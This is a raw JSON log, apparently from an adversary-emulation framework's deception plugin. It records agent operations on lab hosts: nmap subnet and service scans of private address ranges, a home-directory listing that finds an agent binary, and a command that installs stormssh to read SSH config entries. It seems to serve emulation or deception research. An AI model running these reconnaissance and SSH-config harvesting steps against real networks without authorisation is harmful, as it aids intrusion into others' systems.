"192.168.200.4", "created": "2024-04-26T23:50:44Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:50:44Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf479dea0>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf479e2f0>", "source": {"unique": "host.remote.ip192.168.200.5", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.5", "created": "2024-04-26T23:50:44Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:50:44Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf479c9d0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf479d4e0>", "source": {"unique": "host.remote.ip192.168.200.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.3", "created": "2024-04-26T23:50:44Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:50:44Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf479c430>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf479d0c0>", "source": {"unique": "host.remote.ip192.168.200.4", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.4", "created": "2024-04-26T23:50:44Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:50:44Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf479cdf0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf479f490>", "source": {"unique": "host.remote.ip192.168.200.5", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.5", "created": "2024-04-26T23:50:44Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:50:44Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.remote.addr192.168.200.3,4,5", "trait": "scan.remote.addr", "name": "scan.remote.addr", "value": "192.168.200.3,4,5", "created": "2024-04-26T23:50:33Z", "score": 7, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "75bed3c0-a10f-419c-bb81-24ec4e400d57", "collect": "2024-04-26T23:50:37Z", "finish": "2024-04-26T23:50:44Z", "ability": {"ability_id": "deception-nmap", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.004", "name": "Deception Nmap Host", "description": "Scans a host for open ports", "executors": [{"name": "sh", "platform": "linux", "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"source": "host.remote.ip", "edge": "has_open_ports", "target": "host.remote.ports", "custom_parser_vals": {}}, {"source": "host.remote.ip", "edge": "has_port_services", "target": "host.remote.port_services", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"source": "host.remote.ip", "edge": "has_open_ports", "target": "host.remote.ports", "custom_parser_vals": {}}, {"source": "host.remote.ip", "edge": "has_port_services", "target": "host.remote.port_services", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "database-a", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:50:37Z"}, {"id": "e49820d2-161c-4f5d-b816-f729b62a26e2", "paw": "cfisqp", "command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "plaintext_command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "status": 0, "score": 0, "decide": "2024-04-26T23:50:48Z", "pin": 0, "pid": "1653", "facts": [], "relationships": [], "used": [], "unique": "e49820d2-161c-4f5d-b816-f729b62a26e2", "collect": "2024-04-26T23:50:48Z", "finish": "2024-04-26T23:50:57Z", "ability": {"ability_id": "deception-parse-sshconfig", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Parse SSH Config", "description": "Uses stormssh to parse the ssh config file", "executors": [{"name": "sh", "platform": "linux", "command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.ssh", "parserconfigs": [{"source": "remote.ssh.cmd", "edge": "", "target": "", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.ssh", "parserconfigs": [{"source": "remote.ssh.cmd", "edge": "", "target": "", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "employee-a", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:50:48Z"}, {"id": "c162968d-9289-43a6-9d3c-0243e2357460", "paw": "cfisqp", "command": "ls -l /home/employeeA/", "plaintext_command": "ls -l /home/employeeA/", "status": 0, "score": 1, "decide": "2024-04-26T23:50:58Z", "pin": 0, "pid": "1673", "facts": [{"unique": "host.dir.path/home/employeeA/", "trait": "host.dir.path", "name": "host.dir.path", "value": "/home/employeeA/", "created": "2024-04-26T23:50:58Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": ["c162968d-9289-43a6-9d3c-0243e2357460"], "relationships": ["host.dir.path(/home/employeeA/) : has_contents : host.dir.files(['/home/employeeA/sandcat.go'])"], "limit_count": -1, "collected_by": ["cfisqp"], "technique_id": null}, {"unique": "host.dir.files['/home/employeeA/sandcat.go']", "trait": "host.dir.files", "name": "host.dir.files", "value": ["/home/employeeA/sandcat.go"], "created": "2024-04-26T23:50:58Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["c162968d-9289-43a6-9d3c-0243e2357460"], "relationships": ["host.dir.path(/home/employeeA/) : has_contents : host.dir.files(['/home/employeeA/sandcat.go'])"], "limit_count": -1, "collected_by": ["cfisqp"], "technique_id": "T9012"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf49947f0>has_contents<app.objects.secondclass.c_fact.Fact object at 0x7f5cf464a410>", "source": {"unique": "host.dir.path/home/employeeA/", "trait": "host.dir.path", "name": "host.dir.path", "value": "/home/employeeA/", "created": "2024-04-26T23:50:58Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": ["c162968d-9289-43a6-9d3c-0243e2357460"], "relationships": ["host.dir.path(/home/employeeA/) : has_contents : host.dir.files(['/home/employeeA/sandcat.go'])"], "limit_count": -1, "collected_by": ["cfisqp"], "technique_id": null}, "edge": "has_contents", "target": {"unique": "host.dir.files['/home/employeeA/sandcat.go']", "trait": "host.dir.files", "name": "host.dir.files", "value": ["/home/employeeA/sandcat.go"], "created": "2024-04-26T23:50:58Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "host.dir.path/home/employeeA/", "trait": "host.dir.path", "name": "host.dir.path", "value": "/home/employeeA/", "created": "2024-04-26T23:50:58Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": ["c162968d-9289-43a6-9d3c-0243e2357460"], "relationships": ["host.dir.path(/home/employeeA/) : has_contents : host.dir.files(['/home/employeeA/sandcat.go'])"], "limit_count": -1, "collected_by": ["cfisqp"], "technique_id": null}], "unique": "c162968d-9289-43a6-9d3c-0243e2357460", "collect": "2024-04-26T23:50:58Z", "finish": "2024-04-26T23:50:58Z", "ability": {"ability_id": "deception-ls", "tactic": "utility", "technique_name": "Deception Enum Folders", "technique_id": "T9012", "name": "Enumerate all folders withing a directory", "description": "Enumerates all folders within a directory", "executors": [{"name": "sh", "platform": "linux", "command": "ls -l #{host.dir.path}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 15, "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"source": "host.dir.path", "edge": "has_children", "target": "host.dir.contents", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["utility"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "ls -l #{host.dir.path}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 15, "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"source": "host.dir.path", "edge": "has_children", "target": "host.dir.contents", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "employee-a", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:50:58Z"}, {"id": "c144d9fb-7334-4baa-9c4c-427c5aa2f2b2", "paw": "cfisqp", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.202.0/24", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.202.0/24", "status": 0, "score": 1, "decide": "2024-04-26T23:51:03Z", "pin": 0, "pid": "1675", "facts": [{"unique": "host.subnet.ipaddrs192.168.202.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.202.0/24", "created": "2024-04-26T23:39:22Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["527e0f53-965b-492f-b99c-ef0b203dd210", "7a846efd-64e1-4d5f-acaf-b7f0daf27897", "95c7474e-c9af-4a1b-9305-1b4d6df22d65", "fc9592ce-36cb-47f3-99f7-3396c423f28b", "27eea4c0-3b4f-40a9-a774-6b3e6c289dd0", "47fd5207-03ae-4378-afa1-84f0e7a890d7", "d8bd914e-39d8-44fc-b217-7182f38229b6", "c144d9fb-7334-4baa-9c4c-427c5aa2f2b2"], "relationships": ["host.subnet.ipaddrs(192.168.202.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.202.1', '192.168.202.2', '192.168.202.3'])", "host.subnet.ipaddrs(192.168.202.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.202.3'])", "host.subnet.ipaddrs(192.168.202.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs([])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.006"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4599ea0>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4599930>", "source": {"unique": "host.subnet.ipaddrs192.168.202.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.202.0/24", "created": "2024-04-26T23:51:21Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_online_ipaddrs", "target": {"unique": "host.subnet.online_ipaddrs[]", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": [], "created": "2024-04-26T23:51:21Z", "score": 1, "source": null, "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.subnet.addr192.168.202.0/24", "trait": "scan.subnet.addr", "name": "scan.subnet.addr", "value": "192.168.202.0/24", "created": "2024-04-26T23:51:03Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "c144d9fb-7334-4baa-9c4c-427c5aa2f2b2", "collect": "2024-04-26T23:51:09Z", "finish": "2024-04-26T23:51:21Z", "ability": {"ability_id": "deception-nmapsubnet", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "executors": [{"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "employee-a", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:51:09Z"}, {"id": "1bb1488d-c40c-47f1-888c-97fe1a623b17", "paw": "cfisqp", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "status": 0, "score": 1, "decide": "2024-04-26T23:51:23Z", "pin": 0, "pid": "1677", "facts": [{"unique": "host.subnet.ipaddrs192.168.200.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.200.0/24", "created": "2024-04-26T23:39:35Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["7095ef06-22b7-4473-b807-91ba0dea838b", "e9c873ff-de3a-4d7e-a279-7ba20d4f2eb8", "3e0385dd-eadf-4b80-bc55-4aea1b79aa80", "832fe5d7-e203-4479-a83f-25bc8c762719", "56bc1feb-a57e-470e-837b-9173b738d06d", "af654b8a-e076-47fb-8564-6b40300f2c80", "e2eb1c16-cff6-4a6a-9aa0-ddd3abc9ffa6", "1bb1488d-c40c-47f1-888c-97fe1a623b17"], "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.3', '192.168.200.4', '192.168.200.5'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5'])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.006"}, {"unique": "host.subnet.online_ipaddrs['192.168.200.3', '192.168.200.4', '192.168.200.5']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.200.3", "192.168.200.4", "192.168.200.5"], "created": "2024-04-26T23:51:26Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["1bb1488d-c40c-47f1-888c-97fe1a623b17"], "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.3', '192.168.200.4', '192.168.200.5'])"], "limit_count": -1, "collected_by": ["cfisqp"], "technique_id": "T1021.006"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf452db10>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7f5cf452d8d0>", "source": {"unique": "host.subnet.ipaddrs192.168.200.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.200.0/24", "created": "2024-04-26T23:51:26Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_online_ipaddrs", "target": {"unique": "host.subnet.online_ipaddrs['192.168.200.3', '192.168.200.4', '192.168.200.5']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.200.3", "192.168.200.4", "192.168.200.5"], "created": "2024-04-26T23:51:26Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.subnet.addr192.168.200.0/24", "trait": "scan.subnet.addr", "name": "scan.subnet.addr", "value": "192.168.200.0/24", "created": "2024-04-26T23:51:23Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "1bb1488d-c40c-47f1-888c-97fe1a623b17", "collect": "2024-04-26T23:51:23Z", "finish": "2024-04-26T23:51:26Z", "ability": {"ability_id": "deception-nmapsubnet", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "executors": [{"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "employee-a", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:51:23Z"}, {"id": "67271bd6-f418-4a31-8ac9-adfbbf7e97f4", "paw": "cfisqp", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "status": 0, "score": 1, "decide": "2024-04-26T23:51:28Z", "pin": 0, "pid": "1679", "facts": [{"unique": "host.subnet.ipaddrs192.168.201.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.201.0/24", "created": "2024-04-26T23:40:02Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["8820d7db-0ef2-44ef-8197-501e8ee3c43b", "e07921d6-b9e1-4277-a4d0-c12a3109baa4", "26f46d4f-0c48-4952-99b4-e4a3766799fb", "e9bb737a-d6f7-43ce-a28f-c824629a61a9", "34eeee8c-eb81-48c0-8e26-c4c4a97e4f3f", "27cfc0cb-e7a4-4693-b6d3-fd1cf6d43abb", "9511e310-83f1-4fdd-a60e-24b1d7b4c545", "67271bd6-f418-4a31-8ac9-adfbbf7e97f4"], "relationships": ["host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs([])", "host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90'])", "host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.2', '192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90'])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.006"}, {"unique": "host.subnet.online_ipaddrs['192.168.201.2', '192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.201.2", "192.168.201.3", "192.168.201.4", "192.168.201.5", "192.168.201.6", "192.168.201.82", "192.168.201.90"], "created": "2024-04-26T23:47:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["34eeee8c-eb81-48c0-8e26-c4c4a97e4f3f", "27cfc0cb-e7a4-4693-b6d3-fd1cf6d43abb", "9511e310-83f1-4fdd-a60e-24b1d7b4c545", "67271bd6-f418-4a31-8ac9-adfbbf7e97f4"], "relationships": ["host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.2', '192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90'])"], "limit_count": -1, "collected_by": ["etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.006"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4665930>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4664c40>", "source": {"unique": "host.subnet.ipaddrs192.168.201.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.201.0/24", "created": "2024-04-26T23:51:38Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_online_ipaddrs", "target": {"unique": "host.subnet.online_ipaddrs['192.168.201.2', '192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.201.2", "192.168.201.3", "192.168.201.4", "192.168.201.5", "192.168.201.6", "192.168.201.82", "192.168.201.90"], "created": "2024-04-26T23:51:38Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.subnet.addr192.168.201.0/24", "trait": "scan.subnet.addr", "name": "scan.subnet.addr", "value": "192.168.201.0/24", "created": "2024-04-26T23:51:28Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "67271bd6-f418-4a31-8ac9-adfbbf7e97f4", "collect": "2024-04-26T23:51:35Z", "finish": "2024-04-26T23:51:38Z", "ability": {"ability_id": "deception-nmapsubnet", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "executors": [{"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "employee-a", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:51:35Z"}, {"id": "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084", "paw": "cfisqp", "command": "nmap -sV --version-light -oX - 192.168.200.3,4,5", "plaintext_command": "nmap -sV --version-light -oX - 192.168.200.3,4,5", "status": 0, "score": 1, "decide": "2024-04-26T23:51:43Z", "pin": 0, "pid": "1681", "facts": [{"unique": "host.remote.ip192.168.200.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.3", "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), 